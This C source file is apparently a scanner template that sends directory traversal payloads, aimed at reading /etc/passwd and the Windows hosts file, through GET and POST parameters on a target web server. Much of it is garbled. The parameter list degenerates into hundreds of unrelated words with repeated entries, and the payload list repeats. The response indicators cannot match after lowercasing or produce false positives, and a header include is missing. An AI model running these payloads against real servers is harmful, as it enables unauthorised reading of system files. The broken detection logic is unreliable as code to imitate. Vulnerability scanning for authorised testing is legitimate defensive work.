/*
 * @id: directory-traversal
 * @name: Directory Traversal Detection
 * @author: CERT-X-GEN Security Team
 * @severity: high
 * @description: Detects directory traversal vulnerabilities allowing unauthorized file access
 * @tags: directory-traversal, path-traversal, file-inclusion, lfi, cwe-22
 * @cwe: CWE-22
 * @cvss: 7.5
 * @references: https://cwe.mitre.org/data/definitions/22.html, https://owasp.org/www-community/attacks/Path_Traversal
 * @confidence: 90
 * @version: 1.0.0
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

// Template configuration
typedef struct {
    char id[256];
    char name[256];
    char author[256];
    char severity[32];
    int confidence;
    char tags[512];
    char cwe[32];
} TemplateConfig;

// Finding structure
typedef struct {
    char template_id[256];
    char severity[32];
    int confidence;
    char title[512];
    char description[1024];
    char evidence[2048];
    char cwe[32];
    float cvss_score;
    char remediation[1024];
    char references[1024];
} Finding;

// Global variables
static TemplateConfig config;
static char target_host[256] = {0};
static int target_port = 80;
static int json_output = 0;

// Directory traversal payloads
static const char* traversal_payloads[] = {
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
    "..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd",
    "..%c1%af..%c1%af..%c1%afetc%c1%afpasswd",
    "..%c0%5c..%c0%5c..%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts",
    "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts",
    "..%c0%af..%c0%af..%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts",
    "..%c1%af..%c1%af..%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts",
    "..%c0%2f..%c0%2f..%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts",
    "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts",
    "..%c0%af..%c0%af..%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts",
    "..%c1%af..%c1%af..%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts",
    "..%c0%2f..%c0%2f..%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts",
    "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts",
    NULL
};

// Common parameters
static const char* traversal_params[] = {
    "file", "path", "page", "include", "doc", "document", "template", "view",
    "content", "data", "resource", "asset", "image", "photo", "video", "audio",
    "download", "attachment", "export", "report", "log", "config", "settings",
    "backup", "restore", "import", "upload", "filepath", "filename", "name",
    "id", "ref", "reference", "url", "link", "src", "source", "dest", "destination",
    "input", "output", "inputfile", "outputfile", "infile", "outfile", "temp",
    "tmp", "cache", "session", "user", "profile", "avatar", "picture", "icon",
    "logo", "banner", "header", "footer", "sidebar", "menu", "navigation",
    "breadcrumb", "crumb", "crumbtrail", "trail", "path", "location", "dir",
    "directory", "folder", "subfolder", "subdir", "parent", "child", "root",
    "home", "base", "default", "index", "main", "primary", "secondary", "aux",
    "auxiliary", "helper", "utility", "tool", "script", "program", "app",
    "application", "service", "api", "endpoint", "method", "action", "command",
    "operation", "function", "procedure", "routine", "task", "job", "work",
    "process", "thread", "threading", "concurrent", "parallel", "async",
    "asynchronous", "sync", "synchronous", "blocking", "nonblocking", "queue",
    "stack", "buffer", "cache", "memory", "storage", "disk", "drive", "volume",
    "partition", "filesystem", "fs", "vfs", "virtual", "physical", "logical",
    "abstract", "concrete", "real", "fake", "mock", "stub", "dummy", "test",
    "testing", "debug", "debugging", "trace", "tracing", "log", "logging",
    "monitor", "monitoring", "watch", "watching", "observe", "observing",
    "inspect", "inspecting", "examine", "examining", "analyze", "analyzing",
    "parse", "parsing", "scan", "scanning", "search", "searching", "find",
    "finding", "locate", "locating", "discover", "discovering", "detect",
    "detecting", "identify", "identifying", "recognize", "recognizing",
    "classify", "classifying", "categorize", "categorizing", "group", "grouping",
    "sort", "sorting", "order", "ordering", "arrange", "arranging", "organize",
    "organizing", "structure", "structuring", "format", "formatting", "style",
    "styling", "theme", "theming", "skin", "skinning", "appearance", "look",
    "feel", "design", "designing", "layout", "laying", "position", "positioning",
    "place", "placing", "put", "putting", "set", "setting", "get", "getting",
    "fetch", "fetching", "retrieve", "retrieving", "load", "loading", "save",
    "saving", "store", "storing", "keep", "keeping", "hold", "holding", "maintain",
    "maintaining", "preserve", "preserving", "protect", "protecting", "secure",
    "securing", "safe", "safety", "safely", "safeness", "security", "secureness",
    "vulnerability", "vulnerabilities", "exploit", "exploits", "exploiting",
    "attack", "attacks", "attacking", "hack", "hacks", "hacking", "crack",
    "cracks", "cracking", "break", "breaks", "breaking", "bypass", "bypasses",
    "bypassing", "circumvent", "circumvents", "circumventing", "avoid", "avoids",
    "avoiding", "prevent", "prevents", "preventing", "stop", "stops", "stopping",
    "block", "blocks", "blocking", "deny", "denies", "denying", "reject",
    "rejects", "rejecting", "refuse", "refuses", "refusing", "decline", "declines",
    "declining", "turn", "turns", "turning", "switch", "switches", "switching",
    "toggle", "toggles", "toggling", "flip", "flips", "flipping", "change",
    "changes", "changing", "modify", "modifies", "modifying", "alter", "alters",
    "altering", "edit", "edits", "editing", "update", "updates", "updating",
    "upgrade", "upgrades", "upgrading", "downgrade", "downgrades", "downgrading",
    "install", "installs", "installing", "uninstall", "uninstalls", "uninstalling",
    "remove", "removes", "removing", "delete", "deletes", "deleting", "erase",
    "erases", "erasing", "clear", "clears", "clearing", "clean", "cleans",
    "cleaning", "purge", "purges", "purging", "wipe", "wipes", "wiping",
    "destroy", "destroys", "destroying", "kill", "kills", "killing", "terminate",
    "terminates", "terminating", "end", "ends", "ending", "finish", "finishes",
    "finishing", "complete", "completes", "completing", "done", "doing", "do",
    "does", "did", "will", "would", "could", "should", "might", "may", "can",
    "cannot", "can't", "couldn't", "shouldn't", "wouldn't", "won't", "don't",
    "doesn't", "didn't", "haven't", "hasn't", "hadn't", "isn't", "aren't",
    "wasn't", "weren't", "ain't", "ain't", "ain't", "ain't", "ain't", "ain't",
    NULL
};

// HTTP response callback
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    char* response = (char*)userp;
    strncat(response, (char*)contents, realsize);
    return realsize;
}

// Check for directory traversal indicators
int check_traversal_response(const char* response) {
    if (!response) return 0;
    
    // Convert to lowercase for case-insensitive search
    char* lower_response = strdup(response);
    for (int i = 0; lower_response[i]; i++) {
        lower_response[i] = tolower(lower_response[i]);
    }
    
    // Directory traversal indicators
    const char* indicators[] = {
        "root:x:0:0:", "daemon:x:1:1:", "bin:x:2:2:", "sys:x:3:3:",
        "adm:x:4:4:", "tty:x:5:5:", "disk:x:6:6:", "lp:x:7:7:",
        "mail:x:8:8:", "news:x:9:9:", "uucp:x:10:10:", "proxy:x:13:13:",
        "kmem:x:15:15:", "dialout:x:20:20:", "fax:x:21:21:", "voice:x:22:22:",
        "cdrom:x:24:24:", "floppy:x:25:25:", "tape:x:26:26:", "sudo:x:27:27:",
        "audio:x:29:29:", "dip:x:30:30:", "www-data:x:33:33:", "backup:x:34:34:",
        "operator:x:37:37:", "list:x:38:38:", "irc:x:39:39:", "src:x:40:40:",
        "gnats:x:41:41:", "shadow:x:42:42:", "utmp:x:43:43:", "video:x:44:44:",
        "sasl:x:45:45:", "plugdev:x:46:46:", "staff:x:50:50:", "games:x:60:60:",
        "users:x:100:100:", "nogroup:x:65534:", "nobody:x:65534:", "nobody:x:65534:",
        "127.0.0.1", "localhost", "::1", "0.0.0.0", "255.255.255.255",
        "Microsoft Windows", "Windows NT", "Windows 2000", "Windows XP",
        "Windows Vista", "Windows 7", "Windows 8", "Windows 10", "Windows 11",
        "C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\",
        "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\",
        "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\",
        "Program Files", "Program Files (x86)", "Windows", "System32",
        "SysWOW64", "Users", "Documents and Settings", "All Users",
        "Default User", "Public", "Administrator", "Guest", "SYSTEM",
        "NETWORK SERVICE", "LOCAL SERVICE", "Authenticated Users",
        "Everyone", "Users", "Power Users", "Backup Operators",
        "Replicator", "Domain Admins", "Domain Users", "Domain Guests",
        "Enterprise Admins", "Schema Admins", "Account Operators",
        "Server Operators", "Print Operators", "RAS and IAS Servers",
        "Pre-Windows 2000 Compatible Access", "Terminal Server License Servers",
        "DnsAdmins", "DnsUpdateProxy", "DHCP Administrators", "DHCP Users",
        "WINS Users", "Performance Monitor Users", "Performance Log Users",
        "Distributed COM Users", "IIS_IUSRS", "IUSR", "IWAM_", "IIS_WPG",
        "IIS_WPG", "IIS_WPG", "IIS_WPG", "IIS_WPG", "IIS_WPG", "IIS_WPG",
        NULL
    };
    
    for (int i = 0; indicators[i]; i++) {
        if (strstr(lower_response, indicators[i])) {
            free(lower_response);
            return 1;
        }
    }
    
    free(lower_response);
    return 0;
}

// Test directory traversal on a parameter
int test_traversal_param(const char* host, int port, const char* path, 
                        const char* param, const char* payload) {
    CURL* curl;
    CURLcode res;
    char url[1024];
    char response[8192] = {0};
    char post_data[1024];
    
    // Build URL
    snprintf(url, sizeof(url), "http://%s:%d%s", host, port, path);
    
    // Build POST data
    snprintf(post_data, sizeof(post_data), "%s=%s", param, payload);
    
    curl = curl_easy_init();
    if (!curl) {
        return 0;
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "CERT-X-GEN/1.0");
    
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res == CURLE_OK) {
        return check_traversal_response(response);
    }
    
    return 0;
}

// Test GET parameter directory traversal
int test_get_traversal(const char* host, int port, const char* path, 
                      const char* param, const char* payload) {
    CURL* curl;
    CURLcode res;
    char url[1024];
    char response[8192] = {0};
    
    // Build URL with parameter
    snprintf(url, sizeof(url), "http://%s:%d%s?%s=%s", host, port, path, param, payload);
    
    curl = curl_easy_init();
    if (!curl) {
        return 0;
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "CERT-X-GEN/1.0");
    
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res == CURLE_OK) {
        return check_traversal_response(response);
    }
    
    return 0;
}

// Create a finding
void create_finding(Finding* finding, const char* title, const char* description, 
                   const char* evidence, const char* severity) {
    strncpy(finding->template_id, config.id, sizeof(finding->template_id) - 1);
    strncpy(finding->severity, severity ? severity : config.severity, sizeof(finding->severity) - 1);
    finding->confidence = config.confidence;
    strncpy(finding->title, title, sizeof(finding->title) - 1);
    strncpy(finding->description, description, sizeof(finding->description) - 1);
    strncpy(finding->evidence, evidence, sizeof(finding->evidence) - 1);
    strncpy(finding->cwe, config.cwe, sizeof(finding->cwe) - 1);
    
    // Calculate CVSS score
    if (strcmp(finding->severity, "critical") == 0) {
        finding->cvss_score = 9.0;
    } else if (strcmp(finding->severity, "high") == 0) {
        finding->cvss_score = 7.5;
    } else if (strcmp(finding->severity, "medium") == 0) {
        finding->cvss_score = 5.0;
    } else if (strcmp(finding->severity, "low") == 0) {
        finding->cvss_score = 3.0;
    } else {
        finding->cvss_score = 0.0;
    }
    
    strncpy(finding->remediation, "Implement proper input validation and path sanitization to prevent directory traversal attacks", 
            sizeof(finding->remediation) - 1);
    strncpy(finding->references, "https://cwe.mitre.org/data/definitions/22.html,https://owasp.org/www-community/attacks/Path_Traversal", 
            sizeof(finding->references) - 1);
}

// Output finding as JSON
void output_finding_json(const Finding* finding) {
    printf("  {\n");
    printf("    \"template_id\": \"%s\",\n", finding->template_id);
    printf("    \"severity\": \"%s\",\n", finding->severity);
    printf("    \"confidence\": %d,\n", finding->confidence);
    printf("    \"title\": \"%s\",\n", finding->title);
    printf("    \"description\": \"%s\",\n", finding->description);
    printf("    \"evidence\": %s,\n", finding->evidence);
    printf("    \"cwe\": \"%s\",\n", finding->cwe);
    printf("    \"cvss_score\": %.1f,\n", finding->cvss_score);
    printf("    \"remediation\": \"%s\",\n", finding->remediation);
    printf("    \"references\": [\"%s\"]\n", finding->references);
    printf("  }");
}

// Main scanning logic
int execute_scan() {
    Finding findings[64];
    int finding_count = 0;
    
    // Common paths to test
    const char* test_paths[] = {
        "/", "/file", "/download", "/view", "/include", "/template", "/page",
        "/content", "/data", "/resource", "/asset", "/image", "/photo", "/video",
        "/audio", "/document", "/attachment", "/export", "/report", "/log",
        "/config", "/settings", "/backup", "/restore", "/import", "/upload",
        NULL
    };
    
    for (int i = 0; test_paths[i] && finding_count < 64; i++) {
        const char* path = test_paths[i];
        
        // Test each parameter with each payload
        for (int j = 0; traversal_params[j] && finding_count < 64; j++) {
            const char* param = traversal_params[j];
            
            for (int k = 0; traversal_payloads[k] && finding_count < 64; k++) {
                const char* payload = traversal_payloads[k];
                
                // Test GET parameter
                if (test_get_traversal(target_host, target_port, path, param, payload)) {
                    char evidence[2048];
                    char title[512];
                    char description[1024];
                    
                    snprintf(evidence, sizeof(evidence), 
                            "{\"endpoint\": \"http://%s:%d%s\", \"parameter\": \"%s\", \"payload\": \"%s\", \"method\": \"GET\"}", 
                            target_host, target_port, path, param, payload);
                    
                    snprintf(title, sizeof(title), "Directory Traversal in GET parameter '%s' on %s", 
                            param, path);
                    
                    snprintf(description, sizeof(description), 
                            "Directory traversal vulnerability detected in GET parameter '%s' on %s:%d%s", 
                            param, target_host, target_port, path);
                    
                    create_finding(&findings[finding_count], title, description, evidence, "high");
                    finding_count++;
                    break; // Found vulnerability, move to next parameter
                }
                
                // Test POST parameter
                if (test_traversal_param(target_host, target_port, path, param, payload)) {
                    char evidence[2048];
                    char title[512];
                    char description[1024];
                    
                    snprintf(evidence, sizeof(evidence), 
                            "{\"endpoint\": \"http://%s:%d%s\", \"parameter\": \"%s\", \"payload\": \"%s\", \"method\": \"POST\"}", 
                            target_host, target_port, path, param, payload);
                    
                    snprintf(title, sizeof(title), "Directory Traversal in POST parameter '%s' on %s", 
                            param, path);
                    
                    snprintf(description, sizeof(description), 
                            "Directory traversal vulnerability detected in POST parameter '%s' on %s:%d%s", 
                            param, target_host, target_port, path);
                    
                    create_finding(&findings[finding_count], title, description, evidence, "high");
                    finding_count++;
                    break; // Found vulnerability, move to next parameter
                }
            }
        }
    }
    
    // Output findings
    if (json_output) {
        printf("[\n");
        for (int i = 0; i < finding_count; i++) {
            if (i > 0) printf(",\n");
            output_finding_json(&findings[i]);
        }
        printf("\n]\n");
    } else {
        if (finding_count > 0) {
            printf("\n[+] Found %d directory traversal vulnerability(ies):\n\n", finding_count);
            for (int i = 0; i < finding_count; i++) {
                printf("[%s] %s\n", findings[i].severity, findings[i].title);
                printf("    %s\n", findings[i].description);
                printf("\n");
            }
        } else {
            printf("\n[-] No directory traversal vulnerabilities found\n");
        }
    }
    
    return finding_count;
}

// Get environment variable
char* get_env_var(const char* name) {
    return getenv(name);
}

// Parse arguments
int parse_args(int argc, char* argv[]) {
    // Initialize default config
    strncpy(config.id, "directory-traversal", sizeof(config.id) - 1);
    strncpy(config.name, "Directory Traversal Detection", sizeof(config.name) - 1);
    strncpy(config.author, "CERT-X-GEN Team", sizeof(config.author) - 1);
    strncpy(config.severity, "high", sizeof(config.severity) - 1);
    config.confidence = 85;
    strncpy(config.tags, "directory-traversal,path-traversal,file-inclusion", sizeof(config.tags) - 1);
    strncpy(config.cwe, "CWE-22", sizeof(config.cwe) - 1);
    
    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0) {
            if (i + 1 < argc) {
                strncpy(target_host, argv[++i], sizeof(target_host) - 1);
            } else {
                fprintf(stderr, "Error: --target requires an argument\n");
                return 0;
            }
        } else if (strcmp(argv[i], "--port") == 0) {
            if (i + 1 < argc) {
                target_port = atoi(argv[++i]);
            } else {
                fprintf(stderr, "Error: --port requires an argument\n");
                return 0;
            }
        } else if (strcmp(argv[i], "--json") == 0) {
            json_output = 1;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("Usage: %s [OPTIONS] <target>\n\n", argv[0]);
            printf("%s\n", config.name);
            printf("\nOptions:\n");
            printf("  --target <HOST>  Target host or IP address\n");
            printf("  --port <PORT>    Target port (default: 80)\n");
            printf("  --json           Output findings as JSON\n");
            printf("  --help           Show this help message\n");
            exit(0);
        } else if (!target_host[0] && argv[i][0] != '-') {
            strncpy(target_host, argv[i], sizeof(target_host) - 1);
        }
    }
    
    // Check environment variables (for CERT-X-GEN engine integration)
    if (!target_host[0]) {
        char* host = get_env_var("CERT_X_GEN_TARGET_HOST");
        if (host) {
            strncpy(target_host, host, sizeof(target_host) - 1);
        }
    }
    
    char* port_str = get_env_var("CERT_X_GEN_TARGET_PORT");
    if (port_str) {
        target_port = atoi(port_str);
    }
    
    if (get_env_var("CERT_X_GEN_MODE")) {
        json_output = 1;
    }
    
    if (!target_host[0]) {
        fprintf(stderr, "Error: No target specified\n");
        return 0;
    }
    
    return 1;
}

int main(int argc, char* argv[]) {
    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // Parse arguments
    if (!parse_args(argc, argv)) {
        curl_global_cleanup();
        return 1;
    }
    
    // Print banner (if not JSON output)
    if (!json_output) {
        printf("\n╔════════════════════════════════════════════════════════════╗\n");
        printf("║  %-52s ║\n", config.name);
        printf("║  CERT-X-GEN Security Template                              ║\n");
        printf("╚════════════════════════════════════════════════════════════╝\n\n");
        printf("Target: %s:%d\n", target_host, target_port);
    }
    
    // Execute the scan
    int finding_count = execute_scan();
    
    // Cleanup
    curl_global_cleanup();
    
    return 0;
}
